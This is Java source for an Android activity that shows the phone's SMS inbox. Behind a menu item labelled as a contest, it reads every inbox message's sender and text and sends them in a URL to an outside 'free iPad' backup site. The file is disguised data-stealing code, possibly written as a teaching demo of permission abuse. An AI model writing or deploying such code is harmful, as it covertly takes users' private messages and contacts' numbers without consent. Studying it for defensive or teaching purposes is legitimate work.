package com.example.permission.eis.supersms2000;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.v4.app.Fragment;
import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;


public class MainActivity extends ActionBarActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (savedInstanceState == null) {
            getSupportFragmentManager().beginTransaction()
                    .add(R.id.container, new SmsListFragment())
                    .commit();
        }
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_contest) {
            String url = urlFormatSms(getAllSMS(this));
            Log.v("URL", url);

            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            startActivity(browserIntent);
            return true;
        }

        return super.onOptionsItemSelected(item);
    }


    private String urlFormatSms(List<List<String>> allSms) {

        String result = "";

        for (List<String> sms : allSms) {
            if ((result.concat(sms.get(0)).concat(sms.get(1)).length() + 4) > 1700) {
                break;
            }
            result = result.concat("||").concat(sms.get(0)).concat("__").concat(sms.get(1));
        }
        result = result.replace(",", "").replace(" ", "-").replace("&", "");
        try {
            return "https://free-ipad-sms-backup.appspot.com/?sms=" +
                    URLEncoder.encode(result, "utf-8");
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }

        return "";
    }

    private static List<List<String>> getAllSMS(Activity myActivity) {

        List<List<String>> sms = new ArrayList<>();
        Uri uriSMSURI = Uri.parse("content://sms/inbox");
        Cursor cur = myActivity.getContentResolver().query(uriSMSURI, null, null, null, null);

        while (cur.moveToNext()) {
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            sms.add(new ArrayList<String>(Arrays.asList(address, body)));
        }

        return sms;
    }

    /**
     * A simple fragment that lists all sms
     */
    public static class SmsListFragment extends Fragment {



        public SmsListFragment() {
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container,
                                 Bundle savedInstanceState) {
            View rootView = inflater.inflate(R.layout.fragment_main, container, false);
            List<List<String>> sms = getAllSMS(getActivity());
            List<String> formattedSms = new ArrayList<String>();
            List<String> singleSms;

            Iterator<List<String>> iterator = sms.iterator();
            while (iterator.hasNext()) {
                singleSms = iterator.next();
                formattedSms.add(singleSms.get(0) + ":\n\n" + singleSms.get(1));
            }

            ArrayAdapter<String> smsAdapter = new ArrayAdapter<String>(getActivity(),
                    R.layout.list_item_sms,
                    R.id.list_item_sms_textview,
                    formattedSms);
            final ListView myListView = (ListView) rootView.findViewById(R.id.smsListView);
            myListView.setAdapter(smsAdapter);

            return rootView;
        }
    }
}
